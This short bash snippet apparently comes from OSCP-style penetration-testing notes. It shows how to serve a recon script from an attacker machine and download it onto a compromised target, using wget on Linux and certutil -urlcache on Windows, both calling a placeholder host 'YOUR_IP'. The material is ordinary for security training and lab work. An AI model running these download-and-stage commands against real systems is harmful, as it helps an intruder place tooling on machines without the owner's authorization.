```bash
# On attacker machine
cd ~/oscp/scripts/
python3 -m http.server 80

# On target (Linux)
wget http://YOUR_IP/ultimate_recon.py && chmod +x *.py

# On target (Windows)
certutil -urlcache -f http://YOUR_IP/ultimate_recon.py ultimate_recon.py
```
